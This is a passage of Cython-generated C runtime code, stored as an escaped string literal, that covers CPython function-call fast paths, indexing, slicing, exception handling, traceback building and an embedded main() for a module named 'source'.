CO_NOFREE)) {\n        if (argdefs == NULL && co->co_argcount == nargs) {\n            result = __Pyx_PyFunction_FastCallNoKw(co, args, nargs, globals);\n            goto done;\n        }\n        else if (nargs == 0 && argdefs != NULL\n                 && co->co_argcount == Py_SIZE(argdefs)) {\n            /* function called with no arguments, but all parameters have\n               a default value: use default values as arguments .*/\n            args = &PyTuple_GET_ITEM(argdefs, 0);\n            result =__Pyx_PyFunction_FastCallNoKw(co, args, Py_SIZE(argdefs), globals);\n            goto done;\n        }\n    }\n    if (kwargs != NULL) {\n        Py_ssize_t pos, i;\n        kwtuple = PyTuple_New(2 * nk);\n        if (kwtuple == NULL) {\n            result = NULL;\n            goto done;\n        }\n        k = &PyTuple_GET_ITEM(kwtuple, 0);\n        pos = i = 0;\n        while (PyDict_Next(kwargs, &pos, &k[i], &k[i+1])) {\n            Py_INCREF(k[i]);\n            Py_INCREF(k[i+1]);\n            i += 2;\n        }\n        nk = i / 2;\n    }\n    else {\n        kwtuple = NULL;\n        k = NULL;\n    }\n    closure = PyFunction_GET_CLOSURE(func);\n#if PY_MAJOR_VERSION >= 3\n    kwdefs = PyFunction_GET_KW_DEFAULTS(func);\n#endif\n    if (argdefs != NULL) {\n        d = &PyTuple_GET_ITEM(argdefs, 0);\n        nd = Py_SIZE(argdefs);\n    }\n    else {\n        d = NULL;\n        nd = 0;\n    }\n#if PY_MAJOR_VERSION >= 3\n    result = PyEval_EvalCodeEx((PyObject*)co, globals, (PyObject *)NULL,\n                               args, (int)nargs,\n                 ""              k, (int)nk,\n                               d, (int)nd, kwdefs, closure);\n#else\n    result = PyEval_EvalCodeEx(co, globals, (PyObject *)NULL,\n                               args, (int)nargs,\n                               k, (int)nk,\n                               d, (int)nd, closure);\n#endif\n    Py_XDECREF(kwtuple);\ndone:\n    Py_LeaveRecursiveCall();\n    return result;\n}\n#endif\n#endif\n\n/* PyObjectCall */\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {\n    PyObject *result;\n    ternaryfunc call = Py_TYPE(func)->tp_call;\n    if (unlikely(!call))\n        return PyObject_Call(func, arg, kw);\n    if (unlikely(Py_EnterRecursiveCall((char*)\" while calling a Python object\")))\n        return NULL;\n    result = (*call)(func, arg, kw);\n    Py_LeaveRecursiveCall();\n    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {\n        PyErr_SetString(\n            PyExc_SystemError,\n            \"NULL result without error in PyObject_Call\");\n    }\n    return result;\n}\n#endif\n\n/* PyObjectCallMethO */\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg) {\n    PyObject *self, *result;\n    PyCFunction cfunc;\n    cfunc = PyCFunction_GET_FUNCTION(func);\n    self = PyCFunction_GET_SELF(func);\n    if (unlikely(Py_EnterRecursiveCall((char*)\" while calling a Python object\")))\n        return NULL;\n    result = cfunc(self, arg);\n    Py_LeaveRecursiveCall();\n    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {\n        PyErr_SetString(\n            PyExc_SystemError,\n            \"NULL result without error in PyObject_Call\");\n    }\n    return result;\n}\n#endif\n\n/* PyObjectCallOneArg */\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic PyObject* __Pyx__PyObject_CallOneArg(PyObject *func, PyObject *arg) {\n    PyObject *result;\n    PyObject *args = PyTuple_New(1);\n    if (unlikel""y(!args)) return NULL;\n    Py_INCREF(arg);\n    PyTuple_SET_ITEM(args, 0, arg);\n    result = __Pyx_PyObject_Call(func, args, NULL);\n    Py_DECREF(args);\n    return result;\n}\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {\n#if CYTHON_FAST_PYCALL\n    if (PyFunction_Check(func)) {\n        return __Pyx_PyFunction_FastCall(func, &arg, 1);\n    }\n#endif\n    if (likely(PyCFunction_Check(func))) {\n        if (likely(PyCFunction_GET_FLAGS(func) & METH_O)) {\n            return __Pyx_PyObject_CallMethO(func, arg);\n#if CYTHON_FAST_PYCCALL\n        } else if (__Pyx_PyFastCFunction_Check(func)) {\n            return __Pyx_PyCFunction_FastCall(func, &arg, 1);\n#endif\n        }\n    }\n    return __Pyx__PyObject_CallOneArg(func, arg);\n}\n#else\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {\n    PyObject *result;\n    PyObject *args = PyTuple_Pack(1, arg);\n    if (unlikely(!args)) return NULL;\n    result = __Pyx_PyObject_Call(func, args, NULL);\n    Py_DECREF(args);\n    return result;\n}\n#endif\n\n/* GetItemInt */\nstatic PyObject *__Pyx_GetItemInt_Generic(PyObject *o, PyObject* j) {\n    PyObject *r;\n    if (!j) return NULL;\n    r = PyObject_GetItem(o, j);\n    Py_DECREF(j);\n    return r;\n}\nstatic CYTHON_INLINE PyObject *__Pyx_GetItemInt_List_Fast(PyObject *o, Py_ssize_t i,\n                                                              CYTHON_NCP_UNUSED int wraparound,\n                                                              CYTHON_NCP_UNUSED int boundscheck) {\n#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS\n    Py_ssize_t wrapped_i = i;\n    if (wraparound & unlikely(i < 0)) {\n        wrapped_i += PyList_GET_SIZE(o);\n    }\n    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyList_GET_SIZE(o)))) {\n        PyObject *r = PyList_GET_ITEM(o, wrapped_i);\n        Py_INCREF(r);\n        return r;\n    }\n    return __Pyx_GetItemInt_Generic(""o, PyInt_FromSsize_t(i));\n#else\n    return PySequence_GetItem(o, i);\n#endif\n}\nstatic CYTHON_INLINE PyObject *__Pyx_GetItemInt_Tuple_Fast(PyObject *o, Py_ssize_t i,\n                                                              CYTHON_NCP_UNUSED int wraparound,\n                                                              CYTHON_NCP_UNUSED int boundscheck) {\n#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS\n    Py_ssize_t wrapped_i = i;\n    if (wraparound & unlikely(i < 0)) {\n        wrapped_i += PyTuple_GET_SIZE(o);\n    }\n    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyTuple_GET_SIZE(o)))) {\n        PyObject *r = PyTuple_GET_ITEM(o, wrapped_i);\n        Py_INCREF(r);\n        return r;\n    }\n    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));\n#else\n    return PySequence_GetItem(o, i);\n#endif\n}\nstatic CYTHON_INLINE PyObject *__Pyx_GetItemInt_Fast(PyObject *o, Py_ssize_t i, int is_list,\n                                                     CYTHON_NCP_UNUSED int wraparound,\n                                                     CYTHON_NCP_UNUSED int boundscheck) {\n#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS && CYTHON_USE_TYPE_SLOTS\n    if (is_list || PyList_CheckExact(o)) {\n        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyList_GET_SIZE(o);\n        if ((!boundscheck) || (likely(__Pyx_is_valid_index(n, PyList_GET_SIZE(o))))) {\n            PyObject *r = PyList_GET_ITEM(o, n);\n            Py_INCREF(r);\n            return r;\n        }\n    }\n    else if (PyTuple_CheckExact(o)) {\n        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyTuple_GET_SIZE(o);\n        if ((!boundscheck) || likely(__Pyx_is_valid_index(n, PyTuple_GET_SIZE(o)))) {\n            PyObject *r = PyTuple_GET_ITEM(o, n);\n            Py_INCREF(r);\n            return r;\n        }\n    } else {\n        PySequenceMethods *m = Py_TYPE(o)->tp_as_sequence;\n        if (likely(m && m->sq_item)) {""\n            if (wraparound && unlikely(i < 0) && likely(m->sq_length)) {\n                Py_ssize_t l = m->sq_length(o);\n                if (likely(l >= 0)) {\n                    i += l;\n                } else {\n                    if (!PyErr_ExceptionMatches(PyExc_OverflowError))\n                        return NULL;\n                    PyErr_Clear();\n                }\n            }\n            return m->sq_item(o, i);\n        }\n    }\n#else\n    if (is_list || PySequence_Check(o)) {\n        return PySequence_GetItem(o, i);\n    }\n#endif\n    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));\n}\n\n/* SliceObject */\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_GetSlice(PyObject* obj,\n        Py_ssize_t cstart, Py_ssize_t cstop,\n        PyObject** _py_start, PyObject** _py_stop, PyObject** _py_slice,\n        int has_cstart, int has_cstop, CYTHON_UNUSED int wraparound) {\n#if CYTHON_USE_TYPE_SLOTS\n    PyMappingMethods* mp;\n#if PY_MAJOR_VERSION < 3\n    PySequenceMethods* ms = Py_TYPE(obj)->tp_as_sequence;\n    if (likely(ms && ms->sq_slice)) {\n        if (!has_cstart) {\n            if (_py_start && (*_py_start != Py_None)) {\n                cstart = __Pyx_PyIndex_AsSsize_t(*_py_start);\n                if ((cstart == (Py_ssize_t)-1) && PyErr_Occurred()) goto bad;\n            } else\n                cstart = 0;\n        }\n        if (!has_cstop) {\n            if (_py_stop && (*_py_stop != Py_None)) {\n                cstop = __Pyx_PyIndex_AsSsize_t(*_py_stop);\n                if ((cstop == (Py_ssize_t)-1) && PyErr_Occurred()) goto bad;\n            } else\n                cstop = PY_SSIZE_T_MAX;\n        }\n        if (wraparound && unlikely((cstart < 0) | (cstop < 0)) && likely(ms->sq_length)) {\n            Py_ssize_t l = ms->sq_length(obj);\n            if (likely(l >= 0)) {\n                if (cstop < 0) {\n                    cstop += l;\n                    if (cstop < 0) cstop = 0;\n                }\n                if (cst""art < 0) {\n                    cstart += l;\n                    if (cstart < 0) cstart = 0;\n                }\n            } else {\n                if (!PyErr_ExceptionMatches(PyExc_OverflowError))\n                    goto bad;\n                PyErr_Clear();\n            }\n        }\n        return ms->sq_slice(obj, cstart, cstop);\n    }\n#endif\n    mp = Py_TYPE(obj)->tp_as_mapping;\n    if (likely(mp && mp->mp_subscript))\n#endif\n    {\n        PyObject* result;\n        PyObject *py_slice, *py_start, *py_stop;\n        if (_py_slice) {\n            py_slice = *_py_slice;\n        } else {\n            PyObject* owned_start = NULL;\n            PyObject* owned_stop = NULL;\n            if (_py_start) {\n                py_start = *_py_start;\n            } else {\n                if (has_cstart) {\n                    owned_start = py_start = PyInt_FromSsize_t(cstart);\n                    if (unlikely(!py_start)) goto bad;\n                } else\n                    py_start = Py_None;\n            }\n            if (_py_stop) {\n                py_stop = *_py_stop;\n            } else {\n                if (has_cstop) {\n                    owned_stop = py_stop = PyInt_FromSsize_t(cstop);\n                    if (unlikely(!py_stop)) {\n                        Py_XDECREF(owned_start);\n                        goto bad;\n                    }\n                } else\n                    py_stop = Py_None;\n            }\n            py_slice = PySlice_New(py_start, py_stop, Py_None);\n            Py_XDECREF(owned_start);\n            Py_XDECREF(owned_stop);\n            if (unlikely(!py_slice)) goto bad;\n        }\n#if CYTHON_USE_TYPE_SLOTS\n        result = mp->mp_subscript(obj, py_slice);\n#else\n        result = PyObject_GetItem(obj, py_slice);\n#endif\n        if (!_py_slice) {\n            Py_DECREF(py_slice);\n        }\n        return result;\n    }\n    PyErr_Format(PyExc_TypeError,\n        \"'%.200s' object is unsliceable\", Py_TYPE(obj)->tp_n""ame);\nbad:\n    return NULL;\n}\n\n/* PyObjectCallNoArg */\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func) {\n#if CYTHON_FAST_PYCALL\n    if (PyFunction_Check(func)) {\n        return __Pyx_PyFunction_FastCall(func, NULL, 0);\n    }\n#endif\n#if defined(__Pyx_CyFunction_USED) && defined(NDEBUG)\n    if (likely(PyCFunction_Check(func) || __Pyx_CyFunction_Check(func)))\n#else\n    if (likely(PyCFunction_Check(func)))\n#endif\n    {\n        if (likely(PyCFunction_GET_FLAGS(func) & METH_NOARGS)) {\n            return __Pyx_PyObject_CallMethO(func, NULL);\n        }\n    }\n    return __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL);\n}\n#endif\n\n/* GetTopmostException */\n#if CYTHON_USE_EXC_INFO_STACK\nstatic _PyErr_StackItem *\n__Pyx_PyErr_GetTopmostException(PyThreadState *tstate)\n{\n    _PyErr_StackItem *exc_info = tstate->exc_info;\n    while ((exc_info->exc_type == NULL || exc_info->exc_type == Py_None) &&\n           exc_info->previous_item != NULL)\n    {\n        exc_info = exc_info->previous_item;\n    }\n    return exc_info;\n}\n#endif\n\n/* SaveResetException */\n#if CYTHON_FAST_THREAD_STATE\nstatic CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {\n    #if CYTHON_USE_EXC_INFO_STACK\n    _PyErr_StackItem *exc_info = __Pyx_PyErr_GetTopmostException(tstate);\n    *type = exc_info->exc_type;\n    *value = exc_info->exc_value;\n    *tb = exc_info->exc_traceback;\n    #else\n    *type = tstate->exc_type;\n    *value = tstate->exc_value;\n    *tb = tstate->exc_traceback;\n    #endif\n    Py_XINCREF(*type);\n    Py_XINCREF(*value);\n    Py_XINCREF(*tb);\n}\nstatic CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {\n    PyObject *tmp_type, *tmp_value, *tmp_tb;\n    #if CYTHON_USE_EXC_INFO_STACK\n    _PyErr_StackItem *exc_info = tstate->exc_info;\n    tmp_type = exc_info->exc_type"";\n    tmp_value = exc_info->exc_value;\n    tmp_tb = exc_info->exc_traceback;\n    exc_info->exc_type = type;\n    exc_info->exc_value = value;\n    exc_info->exc_traceback = tb;\n    #else\n    tmp_type = tstate->exc_type;\n    tmp_value = tstate->exc_value;\n    tmp_tb = tstate->exc_traceback;\n    tstate->exc_type = type;\n    tstate->exc_value = value;\n    tstate->exc_traceback = tb;\n    #endif\n    Py_XDECREF(tmp_type);\n    Py_XDECREF(tmp_value);\n    Py_XDECREF(tmp_tb);\n}\n#endif\n\n/* GetException */\n#if CYTHON_FAST_THREAD_STATE\nstatic int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb)\n#else\nstatic int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb)\n#endif\n{\n    PyObject *local_type, *local_value, *local_tb;\n#if CYTHON_FAST_THREAD_STATE\n    PyObject *tmp_type, *tmp_value, *tmp_tb;\n    local_type = tstate->curexc_type;\n    local_value = tstate->curexc_value;\n    local_tb = tstate->curexc_traceback;\n    tstate->curexc_type = 0;\n    tstate->curexc_value = 0;\n    tstate->curexc_traceback = 0;\n#else\n    PyErr_Fetch(&local_type, &local_value, &local_tb);\n#endif\n    PyErr_NormalizeException(&local_type, &local_value, &local_tb);\n#if CYTHON_FAST_THREAD_STATE\n    if (unlikely(tstate->curexc_type))\n#else\n    if (unlikely(PyErr_Occurred()))\n#endif\n        goto bad;\n    #if PY_MAJOR_VERSION >= 3\n    if (local_tb) {\n        if (unlikely(PyException_SetTraceback(local_value, local_tb) < 0))\n            goto bad;\n    }\n    #endif\n    Py_XINCREF(local_tb);\n    Py_XINCREF(local_type);\n    Py_XINCREF(local_value);\n    *type = local_type;\n    *value = local_value;\n    *tb = local_tb;\n#if CYTHON_FAST_THREAD_STATE\n    #if CYTHON_USE_EXC_INFO_STACK\n    {\n        _PyErr_StackItem *exc_info = tstate->exc_info;\n        tmp_type = exc_info->exc_type;\n        tmp_value = exc_info->exc_value;\n        tmp_tb = exc_info->exc_traceback;\n        exc_info->exc_type = local_typ""e;\n        exc_info->exc_value = local_value;\n        exc_info->exc_traceback = local_tb;\n    }\n    #else\n    tmp_type = tstate->exc_type;\n    tmp_value = tstate->exc_value;\n    tmp_tb = tstate->exc_traceback;\n    tstate->exc_type = local_type;\n    tstate->exc_value = local_value;\n    tstate->exc_traceback = local_tb;\n    #endif\n    Py_XDECREF(tmp_type);\n    Py_XDECREF(tmp_value);\n    Py_XDECREF(tmp_tb);\n#else\n    PyErr_SetExcInfo(local_type, local_value, local_tb);\n#endif\n    return 0;\nbad:\n    *type = 0;\n    *value = 0;\n    *tb = 0;\n    Py_XDECREF(local_type);\n    Py_XDECREF(local_value);\n    Py_XDECREF(local_tb);\n    return -1;\n}\n\n/* PyErrFetchRestore */\n#if CYTHON_FAST_THREAD_STATE\nstatic CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {\n    PyObject *tmp_type, *tmp_value, *tmp_tb;\n    tmp_type = tstate->curexc_type;\n    tmp_value = tstate->curexc_value;\n    tmp_tb = tstate->curexc_traceback;\n    tstate->curexc_type = type;\n    tstate->curexc_value = value;\n    tstate->curexc_traceback = tb;\n    Py_XDECREF(tmp_type);\n    Py_XDECREF(tmp_value);\n    Py_XDECREF(tmp_tb);\n}\nstatic CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {\n    *type = tstate->curexc_type;\n    *value = tstate->curexc_value;\n    *tb = tstate->curexc_traceback;\n    tstate->curexc_type = 0;\n    tstate->curexc_value = 0;\n    tstate->curexc_traceback = 0;\n}\n#endif\n\n/* CLineInTraceback */\n#ifndef CYTHON_CLINE_IN_TRACEBACK\nstatic int __Pyx_CLineForTraceback(CYTHON_UNUSED PyThreadState *tstate, int c_line) {\n    PyObject *use_cline;\n    PyObject *ptype, *pvalue, *ptraceback;\n#if CYTHON_COMPILING_IN_CPYTHON\n    PyObject **cython_runtime_dict;\n#endif\n    if (unlikely(!__pyx_cython_runtime)) {\n        return c_line;\n    }\n    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);\n#if CYTHON_COMPILING_IN_CPY""THON\n    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);\n    if (likely(cython_runtime_dict)) {\n        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(\n            use_cline, *cython_runtime_dict,\n            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))\n    } else\n#endif\n    {\n      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);\n      if (use_cline_obj) {\n        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;\n        Py_DECREF(use_cline_obj);\n      } else {\n        PyErr_Clear();\n        use_cline = NULL;\n      }\n    }\n    if (!use_cline) {\n        c_line = 0;\n        (void) PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);\n    }\n    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {\n        c_line = 0;\n    }\n    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);\n    return c_line;\n}\n#endif\n\n/* CodeObjectCache */\nstatic int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {\n    int start = 0, mid = 0, end = count - 1;\n    if (end >= 0 && code_line > entries[end].code_line) {\n        return count;\n    }\n    while (start < end) {\n        mid = start + (end - start) / 2;\n        if (code_line < entries[mid].code_line) {\n            end = mid;\n        } else if (code_line > entries[mid].code_line) {\n             start = mid + 1;\n        } else {\n            return mid;\n        }\n    }\n    if (code_line <= entries[mid].code_line) {\n        return mid;\n    } else {\n        return mid + 1;\n    }\n}\nstatic PyCodeObject *__pyx_find_code_object(int code_line) {\n    PyCodeObject* code_object;\n    int pos;\n    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {\n        return NULL;\n    }\n    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line)"";\n    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {\n        return NULL;\n    }\n    code_object = __pyx_code_cache.entries[pos].code_object;\n    Py_INCREF(code_object);\n    return code_object;\n}\nstatic void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {\n    int pos, i;\n    __Pyx_CodeObjectCacheEntry* entries = __pyx_code_cache.entries;\n    if (unlikely(!code_line)) {\n        return;\n    }\n    if (unlikely(!entries)) {\n        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));\n        if (likely(entries)) {\n            __pyx_code_cache.entries = entries;\n            __pyx_code_cache.max_count = 64;\n            __pyx_code_cache.count = 1;\n            entries[0].code_line = code_line;\n            entries[0].code_object = code_object;\n            Py_INCREF(code_object);\n        }\n        return;\n    }\n    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);\n    if ((pos < __pyx_code_cache.count) && unlikely(__pyx_code_cache.entries[pos].code_line == code_line)) {\n        PyCodeObject* tmp = entries[pos].code_object;\n        entries[pos].code_object = code_object;\n        Py_DECREF(tmp);\n        return;\n    }\n    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {\n        int new_max = __pyx_code_cache.max_count + 64;\n        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(\n            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));\n        if (unlikely(!entries)) {\n            return;\n        }\n        __pyx_code_cache.entries = entries;\n        __pyx_code_cache.max_count = new_max;\n    }\n    for (i=__pyx_code_cache.count; i>pos; i--) {\n        entries[i] = entries[i-1];\n    }\n    entries[pos].code_line = code_line;\n    entries[pos].code_object = code_object;\n    __pyx_code_cache.count++;\n    Py_INCREF(code_""object);\n}\n\n/* AddTraceback */\n#include \"compile.h\"\n#include \"frameobject.h\"\n#include \"traceback.h\"\n#if PY_VERSION_HEX >= 0x030b00a6\n  #ifndef Py_BUILD_CORE\n    #define Py_BUILD_CORE 1\n  #endif\n  #include \"internal/pycore_frame.h\"\n#endif\nstatic PyCodeObject* __Pyx_CreateCodeObjectForTraceback(\n            const char *funcname, int c_line,\n            int py_line, const char *filename) {\n    PyCodeObject *py_code = NULL;\n    PyObject *py_funcname = NULL;\n    #if PY_MAJOR_VERSION < 3\n    PyObject *py_srcfile = NULL;\n    py_srcfile = PyString_FromString(filename);\n    if (!py_srcfile) goto bad;\n    #endif\n    if (c_line) {\n        #if PY_MAJOR_VERSION < 3\n        py_funcname = PyString_FromFormat( \"%s (%s:%d)\", funcname, __pyx_cfilenm, c_line);\n        if (!py_funcname) goto bad;\n        #else\n        py_funcname = PyUnicode_FromFormat( \"%s (%s:%d)\", funcname, __pyx_cfilenm, c_line);\n        if (!py_funcname) goto bad;\n        funcname = PyUnicode_AsUTF8(py_funcname);\n        if (!funcname) goto bad;\n        #endif\n    }\n    else {\n        #if PY_MAJOR_VERSION < 3\n        py_funcname = PyString_FromString(funcname);\n        if (!py_funcname) goto bad;\n        #endif\n    }\n    #if PY_MAJOR_VERSION < 3\n    py_code = __Pyx_PyCode_New(\n        0,\n        0,\n        0,\n        0,\n        0,\n        __pyx_empty_bytes, /*PyObject *code,*/\n        __pyx_empty_tuple, /*PyObject *consts,*/\n        __pyx_empty_tuple, /*PyObject *names,*/\n        __pyx_empty_tuple, /*PyObject *varnames,*/\n        __pyx_empty_tuple, /*PyObject *freevars,*/\n        __pyx_empty_tuple, /*PyObject *cellvars,*/\n        py_srcfile,   /*PyObject *filename,*/\n        py_funcname,  /*PyObject *name,*/\n        py_line,\n        __pyx_empty_bytes  /*PyObject *lnotab*/\n    );\n    Py_DECREF(py_srcfile);\n    #else\n    py_code = PyCode_NewEmpty(filename, funcname, py_line);\n    #endif\n    Py_XDECREF(py_funcname);  // XDECREF since it's only ""set on Py3 if cline\n    return py_code;\nbad:\n    Py_XDECREF(py_funcname);\n    #if PY_MAJOR_VERSION < 3\n    Py_XDECREF(py_srcfile);\n    #endif\n    return NULL;\n}\nstatic void __Pyx_AddTraceback(const char *funcname, int c_line,\n                               int py_line, const char *filename) {\n    PyCodeObject *py_code = 0;\n    PyFrameObject *py_frame = 0;\n    PyThreadState *tstate = __Pyx_PyThreadState_Current;\n    PyObject *ptype, *pvalue, *ptraceback;\n    if (c_line) {\n        c_line = __Pyx_CLineForTraceback(tstate, c_line);\n    }\n    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);\n    if (!py_code) {\n        __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);\n        py_code = __Pyx_CreateCodeObjectForTraceback(\n            funcname, c_line, py_line, filename);\n        if (!py_code) {\n            /* If the code object creation fails, then we should clear the\n               fetched exception references and propagate the new exception */\n            Py_XDECREF(ptype);\n            Py_XDECREF(pvalue);\n            Py_XDECREF(ptraceback);\n            goto bad;\n        }\n        __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);\n        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);\n    }\n    py_frame = PyFrame_New(\n        tstate,            /*PyThreadState *tstate,*/\n        py_code,           /*PyCodeObject *code,*/\n        __pyx_d,    /*PyObject *globals,*/\n        0                  /*PyObject *locals*/\n    );\n    if (!py_frame) goto bad;\n    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);\n    PyTraceBack_Here(py_frame);\nbad:\n    Py_XDECREF(py_code);\n    Py_XDECREF(py_frame);\n}\n\n/* MainFunction */\n#ifdef __FreeBSD__\n#include <floatingpoint.h>\n#endif\n#if PY_MAJOR_VERSION < 3\nint main(int argc, char** argv) {\n#elif defined(WIN32) || defined(MS_WINDOWS)\nint wmain(int argc, wchar_t **argv) {\n#else\nstatic int __Pyx_main(int argc, wchar_t **argv) {\n#endif\n    /* 75""4 requires that FP exceptions run in \"no stop\" mode by default,\n     * and until C vendors implement C99's ways to control FP exceptions,\n     * Python requires non-stop mode.  Alas, some platforms enable FP\n     * exceptions by default.  Here we disable them.\n     */\n#ifdef __FreeBSD__\n    fp_except_t m;\n    m = fpgetmask();\n    fpsetmask(m & ~FP_X_OFL);\n#endif\n    if (argc && argv)\n        Py_SetProgramName(argv[0]);\n    Py_Initialize();\n    if (argc && argv)\n        PySys_SetArgv(argc, argv);\n    {\n      PyObject* m = NULL;\n      __pyx_module_is_main_source = 1;\n      #if PY_MAJOR_VERSION < 3\n          initsource();\n      #elif CYTHON_PEP489_MULTI_PHASE_INIT\n          m = PyInit_source();\n          if (!PyModule_Check(m)) {\n              PyModuleDef *mdef = (PyModuleDef *) m;\n              PyObject *modname = PyUnicode_FromString(\"__main__\");\n              m = NULL;\n              if (modname) {\n                  m = PyModule_NewObject(modname);\n                  Py_DECREF(modname);\n                  if (m) PyModule_ExecDef(m, mdef);\n              }\n          }\n      #else\n          m = PyInit_source();\n      #endif\n      if (PyErr_Occurred()) {\n          PyErr_Print();\n          #if PY_MAJOR_VERSION < 3\n          if (Py_FlushLine()) PyErr_Clear();\n          #endif\n          return 1;\n      }\n      Py_XDECREF(m);\n    }\n#if PY_VERSION_HEX < 0x03060000\n    Py_Finalize();\n#else\n    if (Py_FinalizeEx() < 0)\n        return 2;\n#endif\n    return 0;\n}\n#if PY_MAJOR_VERSION >= 3 && !defined(WIN32) && !defined(MS_WINDOWS)\n#include <locale.h>\nstatic wchar_t*\n__Pyx_char2wchar(char* arg)\n{\n    wchar_t *res;\n#ifdef HAVE_BROKEN_MBSTOWCS\n    /* Some platforms have a broken implementation of\n     * mbstowcs which does not count the characters that\n     * would result from conversion.  Use an upper bound.\n     */\n    size_t argsize = strlen(arg);\n#else\n    size_t argsize = mbstowcs(NULL, arg, 0);\n#endif\n    size_""t count;\n    unsigned char *in;\n    wchar_t *out;\n#ifdef HAVE_MBRTOWC\n    mbstate_t mbs;\n#endif\n    if (argsize != (size_t)-1) {\n        res = (wchar_t *)malloc((argsize+1)*sizeof(wchar_t));\n        if (!res)\n            goto oom;\n        count = mbstowcs(res, arg, argsize+1);\n        if (count != (size_t)-1) {\n            wchar_t *tmp;\n            /* Only use the result if it contains no\n               surrogate characters. */\n            for (tmp = res; *tmp != 0 &&\n                     (*tmp < 0xd800 || *tmp > 0xdfff); tmp++)\n                ;\n            if (*tmp == 0)\n                return res;\n        }\n        free(res);\n    }\n#ifdef HAVE_MBRTOWC\n    /* Overallocate; as multi-byte characters are in the argument, the\n       actual output could use less memory. */\n    argsize = strlen(arg) + 1;\n    res = (wchar_t *)malloc(argsize*sizeof(wchar_t));\n    if (!res) goto oom;\n    in = (unsigned char*)arg;\n    out = res;\n    memset(&mbs, 0, sizeof mbs);\n    while (argsize) {\n        size_t converted = mbrtowc(out, (char*)in, argsize, &mbs);\n        if (converted == 0)\n            break;\n        if (converted == (size_t)-2) {\n            /* Incomplete character. This should never happen,\n               since we provide everything that we have -\n               unless there is a bug in the C library, or I\n               misunderstood how mbrtowc works. */\n            fprintf(stderr, \"unexpected mbrtowc result -2\\\\n\");\n            free(res);\n            return NULL;\n        }\n        if (converted == (size_t)-1) {\n            /* Conversion error. Escape as UTF-8b, and start over\n               in the initial shift state. */\n            *out++ = 0xdc00 + *in++;\n            argsize--;\n            memset(&mbs, 0, sizeof mbs);\n            continue;\n        }\n        if (*out >= 0xd800 && *out <= 0xdfff) {\n            /* Surrogate character.  Escape the original\n               byte sequence with surrogateescape. */""\n            argsize -= converted;\n            while (converted--)\n                *out++ = 0xdc00 + *in++;\n            continue;\n        }\n        in += converted;\n        argsize -= converted;\n        out++;\n    }\n#else\n    /* Cannot use C locale for escaping; manually escape as if charset\n       is ASCII (i.e. escape all bytes > 128. This will still roundtrip\n       correctly in the locale's charset, which must be an ASCII superset. */\n    res = (wchar_t *)malloc((strlen(arg)+1)*sizeof(wchar_t));\n    if (!res) goto oom;\n    in = (unsigned char*)arg;\n    out = res;\n    while(*in)\n        if(*in < 128)\n            *out++ = *in++;\n        else\n            *out++ = 0xdc00 + *in++;\n    *out = 0;\n#endif\n    